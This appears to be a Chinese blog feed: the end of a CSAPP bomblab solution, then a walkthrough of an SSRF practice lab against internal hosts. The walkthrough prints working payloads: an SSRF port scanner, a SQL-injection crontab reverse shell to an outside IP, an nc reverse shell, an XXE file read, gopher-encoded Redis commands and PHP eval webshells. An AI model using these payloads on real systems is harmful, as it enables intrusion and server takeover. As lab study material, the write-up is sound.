class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (!rdi)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">   <span class="keyword">int</span> tmp = *(<span class="keyword">int</span> *)rdi;</span><br><span class="line">   <span class="keyword">if</span> (tmp &lt;= rsi)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="comment">/* 后三次+ */</span></span><br><span class="line">      ret = <span class="number">0</span>; <span class="comment">// 1</span></span><br><span class="line">      <span class="keyword">if</span> (tmp == rsi)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">return</span> ret;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/*  第二次 */</span></span><br><span class="line">      rdi += <span class="number">0x10</span>;</span><br><span class="line">      ret = func7(rdi, rsi);</span><br><span class="line">      ret = ret * <span class="number">2</span> + <span class="number">1</span>; <span class="comment">// 2</span></span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="comment">/* 第一次 */</span></span><br><span class="line">      rdi += <span class="number">0x8</span>;</span><br><span class="line">      ret = func7(rdi, rsi);</span><br><span class="line">      ret *= <span class="number">2</span>;  <span class="comment">// 3</span></span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先要确保最后一个赋值操作在第一次判断就进入，第二个赋值操作第二次判断就进入。剩下的可以第一个和最后一个赋值操作配合执行，但是第二个赋值操作只能调用一次。<br>上面那样做的原因是，第二次判断将rax赋值为0，所以之后只要不进行加法计算就一定为0。<br>那根据上面的二叉树结构就可以推断出可行的序列。</p><blockquote><p>左-&gt;右-&gt;|左|n</p></blockquote><p>可行的答案：0x14或0x16</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
          <category> bomblab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
            <tag> 调试 </tag>
            
            <tag> x86-64汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF打内网</title>
      <link href="/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/"/>
      <url>/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h1 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h1><ul><li>SQLMAP自己写参数的位置（自带：使用星号（*）来指定注入点）</li></ul><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF(服务端跨站请求仿造)漏洞一般都是用来打内网的，为了更加地了解SSRF漏洞的利用方式，今天就结合一下<a href="https://www.sqlsec.com/">国光师傅</a>的<a href="https://github.com/sqlsec/ssrf-vuls">靶场</a>来实战操作一下。<br>为了更好的与实战相结合，这里就在黑盒模式下进行攻击。</p><h1 id="外网服务"><a href="#外网服务" class="headerlink" title="外网服务"></a>外网服务</h1><p>端口18006开启了一个WEB服务，主要功能是对用户输入的网址拍一个快照，那这里就有可能存在SSRF漏洞了，输入一个本地的端口80发现可以成功访问。<br>好，那接下来就先测试一个该主机开放了哪些端口吧。</p><h2 id="利用dict等协议进行端口探测"><a href="#利用dict等协议进行端口探测" class="headerlink" title="利用dict等协议进行端口探测"></a>利用dict等协议进行端口探测</h2><p>首先编写一个python脚本来探测一下开放的端口，当然现实中效率怎么高就怎么来，这里本人是为了练习一下脚本的编写。<br>需要注意的是我们应该采取什么办法来探测端口是否开放，经过实践得出有的WEB服务无法处理dict协议的请求，会发生超时。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gettext <span class="keyword">import</span> find</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> HTTPHandler</span><br><span class="line"><span class="keyword">from</span> sqlite3 <span class="keyword">import</span> adapters</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> style</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> regex <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> rich.console <span class="keyword">import</span> Console</span><br><span class="line"></span><br><span class="line">sem = Semaphore(<span class="number">3</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hostIsAlive</span>(<span class="params">url, ip</span>):</span></span><br><span class="line">    <span class="comment"># 无法有效的识别特定IP地址的主机是否存在</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dictPortScan</span>(<span class="params">url, targetURL</span>):</span></span><br><span class="line">    s = Session()</span><br><span class="line">    timeoutQueue = []</span><br><span class="line">    console = Console()</span><br><span class="line">    s.mount(<span class="string">&quot;http://&quot;</span>, HTTPAdapter(max_retries=<span class="number">20</span>))</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    filename = <span class="string">&quot;E://&quot;</span>+ findall(<span class="string">r&#x27;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]&#123;1,3&#125;&#x27;</span> ,url)[<span class="number">0</span>] + <span class="string">&quot;_&quot;</span> + targetURL + <span class="string">&quot;_open_port.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> sem:</span><br><span class="line">        console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;current_thread()&#125;</span>\n&quot;</span>)</span><br><span class="line">        f  = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65535</span>, <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = <span class="string">&quot;dict://&quot;</span> + targetURL + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">                req = s.post(url=url, data=&#123;<span class="string">&quot;url&quot;</span>: data&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">                response = req.text</span><br><span class="line">                <span class="keyword">if</span> search(<span class="string">r&quot;&lt;pre&gt;&lt;/pre&gt;&quot;</span>, response):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> open\n&quot;</span>)</span><br><span class="line">                    console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> OPEN\n&quot;</span>, style=<span class="string">&quot;bold green&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                console.<span class="built_in">print</span>(<span class="string">f&quot;timeout when handle data=<span class="subst">&#123;data&#125;</span>, url=<span class="subst">&#123;url&#125;</span>\n&quot;</span>, style=<span class="string">&quot;bold red&quot;</span>)</span><br><span class="line">                console.<span class="built_in">print</span>(<span class="string">&quot;Adding to queue...\n&quot;</span>)</span><br><span class="line">                timeoutQueue.append(data)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> timeout <span class="keyword">in</span> timeoutQueue:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                timeout = timeout.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">                req = s.post(url=url, data=&#123;<span class="string">&quot;url&quot;</span>: timeout&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">                response = req.text</span><br><span class="line">                <span class="keyword">if</span> search(<span class="string">r&quot;&lt;pre&gt;&lt;/pre&gt;&quot;</span>, response):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> open\n&quot;</span>)</span><br><span class="line">                    console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> OPEN\n&quot;</span>, style=<span class="string">&quot;bold green&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data&#125;</span> failed after another try!\n&quot;</span>, style=<span class="string">&quot;bold red&quot;</span>)</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    targetURLList = [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;172.72.23.22&quot;</span>, <span class="string">&quot;172.72.23.23&quot;</span>, <span class="string">&quot;172.72.23.24&quot;</span>, <span class="string">&quot;172.72.23.25&quot;</span>, <span class="string">&quot;172.72.23.26&quot;</span>, <span class="string">&quot;172.72.23.27&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;172.72.23.28&quot;</span>, <span class="string">&quot;172.72.23.29&quot;</span>, <span class="string">&quot;172.72.23.30&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> targetURL <span class="keyword">in</span> targetURLList:</span><br><span class="line">        thr = Thread(target=dictPortScan, args=(<span class="string">&quot;http://1.13.173.107:18006/&quot;</span>, targetURL))</span><br><span class="line">        thr.start()</span><br></pre></td></tr></table></figure><p>各个地址开放的服务：<br>| IP | 端口 | 服务 |<br>| :—-: | :—-: | :—-: |<br>| 172.72.23.22 | 80 | WEB |<br>| 172.72.23.23 | 80 | WEB |<br>| 172.72.23.23 | 3306 | MYSQL |<br>| 172.72.23.24 | 80 | WEB |<br>| 172.72.23.25 | 80 | WEB |<br>| 172.72.23.26 | 8080 | WEB |<br>| 172.72.23.27 | 6379 | redis |<br>| 172.72.23.28 | 6379 | redis |<br>| 172.72.23.28 | 80 | web |<br>| 172.72.23.29 | 80 | WEB |<br>| 172.72.23.30 | 3306 | MYSQL | </p><h1 id="172-72-23-22"><a href="#172-72-23-22" class="headerlink" title="172.72.23.22"></a>172.72.23.22</h1><h2 id="80WEB服务"><a href="#80WEB服务" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>看到直接提示了代码注入，那先用burp suite试试参数fuzz，没什么结果。接下来扫一下目录，看看有没有东西。<br>因为这个是内网的机器，所以要么将这个服务代理出来，要么修改爆破位置，这个由于是POST请求所以使用burp suite更快一点。<br>通过修改<code>index.</code>的后缀进行访问，发现该网站是用PHP开发出来的。<br><code>wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hs &quot;404 Not Found&quot; -d &quot;url=172.72.23.22:80/FUZZ.php&quot; http://1.13.173.107:18006/</code><br><code>--hs</code>选项代表隐藏符合正则表达式的请求，<code>--ss</code>代表不隐藏。将要<code>FUZZ</code>的参数设置在POST请求的请求体部分，最后查看成功的请求。<br>有用的只有<code>index phpinfo shell</code>这三个页面，通过名字就可以知道各个页面的功能。<br>之后的利用过程可以看<code>28</code>靶机的步骤，这里不再赘述。</p><h1 id="172-72-23-23"><a href="#172-72-23-23" class="headerlink" title="172.72.23.23"></a>172.72.23.23</h1><h2 id="80WEB服务-1"><a href="#80WEB服务-1" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>一个GET型的SQL注入，开启了3306端口那么很有可能是连接MYSQL的一个网站，这时注入方法就明确了。<br>首先测到一共有4列，第一、二、四列会显示到前端界面。<br>这里放一个sqlmap的详细<a href="https://thedarksource.com/sqlmap-cheat-sheet/#use-post-requests-test-all-parameters">操作手册</a>(英文版)。<br>查出<code>flag_is_here,users</code>这两个表，注意POST数据要将特殊字符编码。<br>可以在mysql系统数据库user表中找到用户的名字(User)和哈希(Password)，然后爆破一下。查了一下密码是空的…<br>那就老实的写shell吧。<br>之前根据<code>session_user()</code>函数查看到用户名是root，那么很有可能是root权限，可以写下计划任务来反弹shell。<br>查看<code>mysql.user</code>中的<code>secure_file_priv</code>全局变量发现没有设置任何值且不为NULL，证明我们可以任意写文件。<br>查看方法：<code>select @@global.secure_file_priv</code><br><strong>注意：</strong>不能写入已经存在的文件，也就是不能覆盖写文件。<br>写入计划任务时要注意格式，如果存在其它数据应该换行<code>\r\n</code>处理。如下：<br><code>union+select+1,2,3,&quot;\r\n&quot;+INTO+OUTFILE+&quot;/etc/crontab&quot;+lines+terminated+by+&quot;*/1+*+*+*+*+root+/bin/bash+-i+&gt;/dev/tcp/42.192.56.33/18030+0&gt;%261&quot;--+</code><br>写入成功后一直无法反弹shell，后来登录docker看了一下，发现这个计划任务的路径是在<code>/etc/crontabs/root</code>下，那写入<code>/etc/crontab</code>就无法执行。<br>那只能写WEB shell了。<br>查看<code>/etc/passwd</code>文件看看是什么类型的服务器，发现存在nginx用户，那就确定是一个nginx服务器了。</p><h3 id="写入WEB-shell"><a href="#写入WEB-shell" class="headerlink" title="写入WEB shell"></a>写入WEB shell</h3><p><code>union+select+load_file(&quot;/etc/nginx/conf.d/default.conf&quot;),2,3,4--+</code>查看nginx的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">  #listen       [::]:80; #uncomment for IPv6 support</span><br><span class="line">  listen       80;</span><br><span class="line"></span><br><span class="line">  root /data/htdocs;</span><br><span class="line">  index  index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">  disable_symlinks off;</span><br><span class="line"></span><br><span class="line">  location = /robots.txt &#123;</span><br><span class="line">    allow all;</span><br><span class="line">    log_not_found off;</span><br><span class="line">    access_log off;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # deny dot-files</span><br><span class="line">  location ~ /\. &#123;</span><br><span class="line">    deny all;</span><br><span class="line">    access_log off;</span><br><span class="line">    log_not_found off;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    try_files $uri $uri/ /index.html /index.php;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">  location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">    if (!-f $document_root$fastcgi_script_name) &#123;</span><br><span class="line">      return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    #fastcgi_pass unix:/var/run/php7-fpm.sock;</span><br><span class="line">    fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    include fastcgi_params;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>发现根目录在<code>/data/htdocs</code>下面，接下来先写入一个<code>&lt;?php phpinfo(); ?&gt;</code>来测试一下，成功写入。<br>在往后也就是写入shell命令执行，再反弹shell之类的内容，可以参考<code>28</code>地址靶机的过程。</p><h1 id="172-72-23-24"><a href="#172-72-23-24" class="headerlink" title="172.72.23.24"></a>172.72.23.24</h1><h2 id="80WEB服务-2"><a href="#80WEB服务-2" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>80端口是一个PING IP地址的服务，典型的命令执行场景，但是我们不可以直接在浏览器中发送数据，因为点击按钮发送后，数据直接给了外网服务器而不是内网服务器。所以我们需要构造POST数据，然后使用gopher协议发送。<br><img src="https://s2.loli.net/2022/04/09/sr4IhB62lk1YtyN.png" alt="image.png"><br>如图可以构造POST请求发送数据，当然首先需要将所有字符进行URL编码，之后再将特殊字符进行URL编码。<br>接下来就是反弹shell操作了。…省略<br><code>nc ip port -e /bin/bash</code>使用bash反弹不成功，那就使用nc来反弹一下。<br>输出源代码，发现使用的是exec来执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 8e018e3ccb13 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 Linux</span><br></pre></td></tr></table></figure><p><code>searchsploit linux 2.4 ubuntu priv esc</code>使用kali自带工具搜索该版本下的提权方法，找不到什么太有用的信息，先继续攻打下一个靶机。</p><h1 id="172-72-23-25"><a href="#172-72-23-25" class="headerlink" title="172.72.23.25"></a>172.72.23.25</h1><p>一个登录界面，查看页面源代码发现了用来登录的AJAX请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&#x27;text/javascript&#x27;</span>&gt; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line"><span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">alert(<span class="string">&quot;用户名或密码不为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">                swal(<span class="string">&quot;登录失败&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">                swal(<span class="string">&quot;登录成功&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                swal(<span class="string">&quot;系统错误&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用来登录的数据是xml格式的，这个还真不常见，毕竟现在基本没有开发者用xml格式存储登录信息了。<br>竟然这样就先构造一个POST请求吧，由于XMLHttpReque请求需要一些特定的头部，所以咱们先发送下请求，然后使用burp suite抓取到的请求包进行SSRF。</p><div class="note primary simple"><p>注意URL编码的地方和次数，也不要忘了Content-Length参数</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url=gopher%3a//172.72.23.25%3a80/_POST /doLogin.php HTTP/1.1</span><br><span class="line">Host: 1.13.173.107:18006</span><br><span class="line">Content-Type: application/xml;charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>测了下SQL注入没有作用，看了下源代码发现是作者根本没有进行数据库操作，那就尝试下XML注入。<br>返回给我们的部分是账号，那就在账号部分进行注入。<br>其实不直接返回到网页中也没关系，我们可以利用http协议来外带数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aha [</span><br><span class="line">  &lt;!ENTITY aha SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;aha;&lt;/username&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>可以直接写在一行中，这里为了看的更清楚就写了多行。不要忘记<code>&amp;aha</code>后面的<code>;</code>，否则程序不会识别成功。<br>通过XXE达到命令执行的目的需要利用编程语言所支持的协议，该过程先跳过，xxe漏洞一般是用来获取信息从而配合其它漏洞达到危害更高的目的。</p><h1 id="172-72-23-26"><a href="#172-72-23-26" class="headerlink" title="172.72.23.26"></a>172.72.23.26</h1><p>8080端口是一个8.5版本的Tomcat，有一个漏洞是后台弱口令<code>tomcat/tomcat</code>，进入后台可以上传文件。因为是利用SSRF漏洞访问的，所以不太方便登入后台。<br>还存在一个CVE-2017-12615，可以用PUT方法上传文件。<br>Tomcat默认不允许上传<code>jsp jspx</code>格式的文件，但是我们可以更改文件后缀为<code>jsp/</code>进行绕过。<br>最后返回状态码<code>201 created</code>就证明上传成功了。<br>jsp马<a href="https://github.com/threedr3am/JSP-WebShells">链接</a></p><h1 id="172-72-23-27"><a href="#172-72-23-27" class="headerlink" title="172.72.23.27"></a>172.72.23.27</h1><p>开启了一个redis服务，使用dict协议访问一下看看有无认证。<br><code>dict://172.72.23.27:6379/info</code><br>发现无认证，那流程就像<code>28</code>靶机一样，只不过这次不需要认证了。</p><h1 id="172-72-23-28"><a href="#172-72-23-28" class="headerlink" title="172.72.23.28"></a>172.72.23.28</h1><h2 id="80WEB服务-3"><a href="#80WEB服务-3" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>首页显示了php源代码，存在文件包含漏洞，可以用该漏洞包含日志文件存而实现GetShell，但是访问的日志文件为空没有任何内容。查看其又开放了6379 redis端口但是需要输入密码进行验证，可以尝试爆破一下，但是存在LFI（本地文件包含漏洞）那么我们就可以尝试直接读取redis的配置文件获得密码。</p><h3 id="读取redis配置文件"><a href="#读取redis配置文件" class="headerlink" title="读取redis配置文件"></a>读取redis配置文件</h3><p>如果不是自己手动安装的redis，那么redis的配置文件默认在/etc/redis.conf(网上大部分教程都存放在这里)。<br>通过输入<code>172.72.23.28:80?file=php://filter/read=convert.base64-encode/resource=/etc/redis.conf</code>读取base64编码后的内容，解码后查找<code>requirepass</code>，得到<code>requirepass P@ssw0rd</code>。<br>这里不知道为什么认证之后再执行命令还会显示需要认证，所以使用gopher协议一次执行多个指令。<br><em>待补充：socat查看流量信息</em><br><a href="https://www.cnblogs.com/lexus/archive/2012/12/02/2798796.html">https://www.cnblogs.com/lexus/archive/2012/12/02/2798796.html</a><br>这里使用<a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">redis-over-gopher</a>工具来生成payload。<br><img src="https://s2.loli.net/2022/04/02/B9iubNlWCEvjIS3.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.72.23.28:6379/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%38%0d%0a%50%40%73%73%77%30%72%64%0d%0a%2a%31%0d%0a%24%34%0d%0a%69%6e%66%6f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%34%0d%0a%24%34%0d%0a%73%68%6f%77%0d%0a%24%35%0d%0a%3c%3f%70%68%70%0d%0a%24%37%0d%0a%70%68%70%69%6e%66%6f%0d%0a%24%32%0d%0a%3f%3e%0d%0a</span><br></pre></td></tr></table></figure><p>利用curl直接发送payload就可以，但是如果是浏览器直接发送则还需要将<strong>特殊字符</strong>再进行一次URL编码（可以直接使用burpsuite自带的功能），来避免特殊字符的干扰。因为PHP在接收到参数后会做一次URL的解码，这样当一些特殊字符再次发送时，是没有经过编码的，也就不会发送成功。<br>最后成功上传文件：<br><img src="https://s2.loli.net/2022/04/02/BnouaIfb5CsFlA1.png" alt="image.png"><br>为了更好的操作我们可以写入计划任务来定时反弹shell。该操作使用gopher一直写不进去，可以研究一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth P@ssw0rd</span><br><span class="line">flushall</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename wtf2.php</span><br><span class="line">set shell &#x27;\r\n&lt;?php @eval($_GET[s]); ?&gt;\r\n&#x27;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>最后一定要save保存，否则不会保存在本地硬盘上面。<br><code>set &#39;wws&#39; &quot;&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;</code>双引号和单引号会影响该redis命令的执行，如果存在则不能执行成功。<br>可是自己直接在redis客户端中写没有问题，经过分析得出是工具的问题，如果payload中包含单引号或双引号会被换行符分隔开。<br><img src="https://s2.loli.net/2022/04/05/DPbCnialMO6ZKN9.png" alt="image.png"><br><img 